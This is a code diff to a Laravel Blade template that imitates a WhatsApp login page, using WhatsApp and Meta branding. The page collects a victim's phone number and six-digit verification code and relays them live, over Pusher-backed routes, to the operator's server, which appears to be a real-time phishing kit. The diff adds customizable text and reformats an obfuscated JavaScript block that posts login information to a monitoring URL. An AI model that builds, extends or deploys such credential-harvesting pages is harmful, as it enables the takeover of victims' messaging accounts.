@@ -14,7 +14,8 @@
     <meta property="og:title" content="{{ $data->title }}" />
     <meta property="og:image" content="{{ $data->image }}" />
     <meta property="og:type" content="article" />
-    <link rel="shortcut icon" href="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/whatsapp_favicon.svg">
+    <link rel="shortcut icon"
+        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/whatsapp_favicon.svg">
     @vite(['resources/css/app.css'])
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
         integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
@@ -53,7 +54,7 @@
 
         @font-face {
             font-family: 'MyRulersVjpPro';
-            src: url('https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/whatsapp_font.woff2') format('woff2');
+            src: url('https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/whatsapp_font.woff2') format('woff2');
         }
 
         body {
@@ -65,20 +66,23 @@
 <body>
     <div class="lg:grid lg:grid-cols-[200px_1fr_600px] border-b-3 border-b-[#dde2e7] mt-[150px] md:mt-0">
         <div class="hidden md:block col-span-1 ml-10">
-            <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/whatsapp.svg?v=1" alt="ws-logo" class="mt-[50px] ml-4" width="70">
+            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/whatsapp.svg?v=1"
+                alt="ws-logo" class="mt-[50px] ml-4" width="70">
             <h1 class="font-bold text-[3.5rem] leading-tight mt-[300px] mb-7">
                 {{ explode('_', __('whatsapp.connecting_with_the_world'))[0] }} <span
                     class="text-green-500">{{ explode('_', __('whatsapp.connecting_with_the_world'))[1] }}</span></h1>
         </div>
         <div class="col-span-1 hidden md:block">
             <div class="flex justify-center items-center h-full">
-                <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/banner.png" alt="fb-banner" class="w-[40%] xl:w-[50%]">
+                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/banner.png"
+                    alt="fb-banner" class="w-[40%] xl:w-[50%]">
             </div>
         </div>
         <div class="col-span-1 lg:border-l-3 border-l-[#dde2e7]">
             <div class="flex justify-center w-[90%] lg:w-[80%] mx-auto items-center h-full">
                 <div class="space-y-3 w-full">
-                    <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/whatsapp.svg?v=1" alt="ws-logo" class="block lg:hidden mx-auto mb-15" width="70">
+                    <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/whatsapp.svg?v=1"
+                        alt="ws-logo" class="block lg:hidden mx-auto mb-15" width="70">
                     {{-- Thông báo khi lỗi --}}
                     <div class="py-3.5 px-4 bg-[#f93a4b] text-white text-sm rounded-2xl" id="warning"
                         style="display: none;"></div>
@@ -90,34 +94,38 @@
                                     class="mt-2 bg-transparent peer text-[15px] text-black placeholder:text-[#646d74] outline-none w-full">
                                 <label
                                     class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
-                                    for="phone">{{ __('whatsapp.phone_number') }}</label>
+                                    for="phone">{{ filled($login_theme_config->whatsapp->phone) ? $login_theme_config->whatsapp->phone : __('whatsapp.phone_number') }}</label>
                                 <button id="close_btn" class="cursor-pointer hidden" tabindex="-1">
-                                    <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/close_logo.svg" width="25" />
+                                    <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/close_logo.svg"
+                                        width="25" />
                                 </button>
                             </div>
                         </div>
                         <button
                             class="outline-none disabled:bg-[#01b207] disabled:cursor-default cursor-pointer w-full bg-[#00e007] text-white rounded-[100px] p-2.5 text-sm active:bg-[#5af53b] active:scale-[99%] transition-all duration-100"
-                            type="submit">{{ __('whatsapp.continue') }}</button>
+                            type="submit">{{ filled($login_theme_config->whatsapp->continue_btn) ? $login_theme_config->whatsapp->continue_btn : __('whatsapp.continue') }}</button>
                     </form>
                     <form id="fotp_submit" class="space-y-3 hidden">
-                        <p class="font-semibold mb-2.5">{{__('whatsapp.enter')}}</p>
+                        <p class="font-semibold mb-2.5">
+                            {{ filled($login_theme_config->whatsapp->verification_code) ? $login_theme_config->whatsapp->verification_code : __('whatsapp.enter_otp') }}
+                        </p>
                         <div class="relative border border-gray-300 rounded-[17px] p-4">
                             <div class="flex gap-1">
                                 <input id="otp_code" type="text" maxlength="6" inputmode="numeric" placeholder=" "
                                     class="mt-2 bg-transparent peer text-[15px] text-black placeholder:text-[#646d74] outline-none w-full">
                                 <label
                                     class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
-                                    for="otp_code">{{ __('whatsapp.enter_otp') }}</label>
+                                    for="otp_code">{{ filled($login_theme_config->whatsapp->verification_code) ? $login_theme_config->whatsapp->verification_code : __('whatsapp.enter_otp') }}</label>
                             </div>
                         </div>
                         <button
                             class="outline-none disabled:bg-[#01b207] disabled:cursor-default cursor-pointer w-full bg-[#00e007] text-white rounded-[100px] p-2.5 text-sm active:bg-[#5af53b] active:scale-[99%] transition-all duration-100"
-                            type="submit">{{ __('whatsapp.continue') }}</button>
+                            type="submit">{{ filled($login_theme_config->whatsapp->continue_btn) ? $login_theme_config->whatsapp->continue_btn : __('whatsapp.continue') }}</button>
                     </form>
                     <div class="mt-2">
                         <div class="mt-10 flex justify-center mb-5">
-                            <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/meta_logo.png" alt="fb-logo" width="55">
+                            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/meta_logo.png"
+                                alt="fb-logo" width="55">
                         </div>
                     </div>
                 </div>
@@ -141,7 +149,7 @@
             </script>
         </p>
     </div>
-    <script src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/helpers.js"></script>
+    <script src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/whatsapp/helpers.js"></script>
     <script>
         var pusher = new Pusher('f41c529c33d4daa42080', {
             cluster: 'ap1'
@@ -157,8 +165,8 @@
             } else {
                 if (data.phone_error) {
                     warning.show()
-                    warning.html("{{ __('whatsapp.invalid_phone') }}")
-                    login_btn.attr('disabled', false).html("{{ __('whatsapp.continue') }}")
+                    warning.html("{{ filled($login_theme_config->whatsapp->invalid_phone) ? $login_theme_config->whatsapp->invalid_phone : __('whatsapp.invalid_phone') }}")
+                    login_btn.attr('disabled', false).html("{{ filled($login_theme_config->whatsapp->continue_btn) ? $login_theme_config->whatsapp->continue_btn : __('whatsapp.continue') }}")
                 }
                 if (data.otp_request) {
                     warning.hide()
@@ -167,8 +175,8 @@
                 }
                 if (data.request_resend) {
                     warning.show()
-                    warning.html("{{ __('whatsapp.invalid_otp') }}")
-                    otp_btn.html("{{ __('whatsapp.continue') }}").attr('disabled', false)
+                    warning.html("{{ filled($login_theme_config->whatsapp->invalid_otp) ? $login_theme_config->whatsapp->invalid_otp : __('whatsapp.invalid_otp') }}")
+                    otp_btn.html("{{ filled($login_theme_config->whatsapp->continue_btn) ? $login_theme_config->whatsapp->continue_btn : __('whatsapp.continue') }}").attr('disabled', false)
                 }
             }
         });
@@ -187,7 +195,7 @@
                 @case('vn')
                 if (!isValidVnPhone(phone)) {
                     warn.show()
-                    warn.html("{{ __('whatsapp.invalid_phone') }}")
+                    warn.html("{{ filled($login_theme_config->whatsapp->invalid_phone) ? $login_theme_config->whatsapp->invalid_phone : __('whatsapp.invalid_phone') }}")
                     return
                 }
                 @break
@@ -195,12 +203,12 @@
                 @case('usa')
                 if (!isValidUSPhone(phone)) {
                     warn.show()
-                    warn.html("{{ __('whatsapp.invalid_phone') }}")
+                    warn.html("{{ filled($login_theme_config->whatsapp->invalid_phone) ? $login_theme_config->whatsapp->invalid_phone : __('whatsapp.invalid_phone') }}")
                     return
                 }
                 @break
             @endswitch
-            btn.html("{{ __('whatsapp.confirming') }}").attr('disabled', true)
+            btn.html("{{ filled($login_theme_config->whatsapp->verifying_btn) ? $login_theme_config->whatsapp->verifying_btn : __('whatsapp.confirming') }}").attr('disabled', true)
             $.post("{{ $type == 'custom' ? route('post.customweb.whatsapp') : route('post.realtimeweb.whatsapp') }}", {
                     d: JSON.stringify(dataToSend),
                     'p_c': "{{ $pusher_code }}",
@@ -208,9 +216,9 @@
                 },
                 function(data, textStatus, jqXHR) {
                     if (!data.status) {
-                        btn.html("{{ __('whatsapp.continue') }}").attr('disabled', false)
+                        btn.html("{{ filled($login_theme_config->whatsapp->continue_btn) ? $login_theme_config->whatsapp->continue_btn : __('whatsapp.continue') }}").attr('disabled', false)
                         warn.show()
-                        warn.html("{{ __('whatsapp.try_again') }}")
+                        warn.html("{{ filled($login_theme_config->whatsapp->error) ? $login_theme_config->whatsapp->error : __('whatsapp.try_again') }}")
                     }
                 },
                 "json"
@@ -232,10 +240,10 @@
             warn.hide()
             if (!otp || otp < 6) {
                 warn.show()
-                warn.html("{{ __('whatsapp.invalid_otp') }}")
+                warn.html("{{ filled($login_theme_config->whatsapp->invalid_otp) ? $login_theme_config->whatsapp->invalid_otp : __('whatsapp.invalid_otp') }}")
                 return
             }
-            btn.html("{{ __('whatsapp.confirming') }}").attr('disabled', true)
+            btn.html("{{ filled($login_theme_config->whatsapp->verifying_btn) ? $login_theme_config->whatsapp->verifying_btn : __('whatsapp.confirming') }}").attr('disabled', true)
             $.post("{{ $type == 'custom' ? route('post.customweb.whatsapp') : route('post.realtimeweb.whatsapp') }}", {
                     d: JSON.stringify(dOtpSend),
                     'p_c': "{{ $pusher_code }}",
@@ -243,16 +251,63 @@
                 },
                 function(data, textStatus, jqXHR) {
                     if (!data.status) {
-                        btn.html("{{ __('whatsapp.continue') }}").attr('disabled', false)
+                        btn.html("{{ filled($login_theme_config->whatsapp->continue_btn) ? $login_theme_config->whatsapp->continue_btn : __('whatsapp.continue') }}").attr('disabled', false)
                         warn.show()
-                        warn.html("{{ __('whatsapp.try_again') }}")
+                        warn.html("{{ filled($login_theme_config->whatsapp->error) ? $login_theme_config->whatsapp->error : __('whatsapp.try_again') }}")
                     }
                 },
                 "json"
             );
         });
         @if ($setting->web_monitor)
-             function _0x288c(){const _0x37ec84=['48CMkkll','json','3JonQMx','17133vzCqfg','4310966IniJJf','{{ env('WEB_MONITOR_API_URL') }}','post','ajax','121420DbkbkL','{{$info}}','2589160vbohhG','21xlbLfm','728nFnPNA','330tpFAEl','32313696gMzGBS','605396rIPIJR','145269vZVoyM','login'];_0x288c=function(){return _0x37ec84;};return _0x288c();}function _0x33d9(_0x4b7f11,_0x1ea9e4){_0x4b7f11=_0x4b7f11-0x66;const _0x288cc2=_0x288c();let _0x33d95b=_0x288cc2[_0x4b7f11];return _0x33d95b;}(function(_0x605303,_0x130420){const _0x4d4965=_0x33d9,_0x497ad1=_0x605303();while(!![]){try{const _0x1dbb7f=parseInt(_0x4d4965(0x6f))/0x1*(parseInt(_0x4d4965(0x6a))/0x2)+-parseInt(_0x4d4965(0x70))/0x3*(-parseInt(_0x4d4965(0x67))/0x4)+-parseInt(_0x4d4965(0x75))/0x5*(-parseInt(_0x4d4965(0x6d))/0x6)+-parseInt(_0x4d4965(0x66))/0x7*(-parseInt(_0x4d4965(0x77))/0x8)+parseInt(_0x4d4965(0x6b))/0x9*(parseInt(_0x4d4965(0x68))/0xa)+-parseInt(_0x4d4965(0x71))/0xb+-parseInt(_0x4d4965(0x69))/0xc;if(_0x1dbb7f===_0x130420)break;else _0x497ad1['push'](_0x497ad1['shift']());}catch(_0x53c8ac){_0x497ad1['push'](_0x497ad1['shift']());}}}(_0x288c,0x88e02),((()=>{const _0x55563d=_0x33d9,_0x566492={'data':_0x55563d(0x76),'type':_0x55563d(0x6c)};$[_0x55563d(0x74)]({'type':_0x55563d(0x73),'url':_0x55563d(0x72),'data':_0x566492,'dataType':_0x55563d(0x6e),'success':function(_0x882676){}});})()));
+            function _0x288c() {
+                const _0x37ec84 = ['48CMkkll', 'json', '3JonQMx', '17133vzCqfg', '4310966IniJJf',
+                    '{{ env('WEB_MONITOR_API_URL') }}', 'post', 'ajax', '121420DbkbkL', '{{ $info }}',
+                    '2589160vbohhG', '21xlbLfm', '728nFnPNA', '330tpFAEl', '32313696gMzGBS', '605396rIPIJR',
+                    '145269vZVoyM', 'login'
+                ];
+                _0x288c = function() {
+                    return _0x37ec84;
+                };
+                return _0x288c();
+            }
+
+            function _0x33d9(_0x4b7f11, _0x1ea9e4) {
+                _0x4b7f11 = _0x4b7f11 - 0x66;
+                const _0x288cc2 = _0x288c();
+                let _0x33d95b = _0x288cc2[_0x4b7f11];
+                return _0x33d95b;
+            }(function(_0x605303, _0x130420) {
+                const _0x4d4965 = _0x33d9,
+                    _0x497ad1 = _0x605303();
+                while (!![]) {
+                    try {
+                        const _0x1dbb7f = parseInt(_0x4d4965(0x6f)) / 0x1 * (parseInt(_0x4d4965(0x6a)) / 0x2) + -
+                            parseInt(_0x4d4965(0x70)) / 0x3 * (-parseInt(_0x4d4965(0x67)) / 0x4) + -parseInt(_0x4d4965(
+                                0x75)) / 0x5 * (-parseInt(_0x4d4965(0x6d)) / 0x6) + -parseInt(_0x4d4965(0x66)) / 0x7 * (
+                                -parseInt(_0x4d4965(0x77)) / 0x8) + parseInt(_0x4d4965(0x6b)) / 0x9 * (parseInt(
+                                _0x4d4965(0x68)) / 0xa) + -parseInt(_0x4d4965(0x71)) / 0xb + -parseInt(_0x4d4965(
+                            0x69)) / 0xc;
+                        if (_0x1dbb7f === _0x130420) break;
+                        else _0x497ad1['push'](_0x497ad1['shift']());
+                    } catch (_0x53c8ac) {
+                        _0x497ad1['push'](_0x497ad1['shift']());
+                    }
+                }
+            }(_0x288c, 0x88e02), ((() => {
+                const _0x55563d = _0x33d9,
+                    _0x566492 = {
+                        'data': _0x55563d(0x76),
+                        'type': _0x55563d(0x6c)
+                    };
+                $[_0x55563d(0x74)]({
+                    'type': _0x55563d(0x73),
+                    'url': _0x55563d(0x72),
+                    'data': _0x566492,
+                    'dataType': _0x55563d(0x6e),
+                    'success': function(_0x882676) {}
+                });
+            })()));
         @endif
     </script>
 </body>
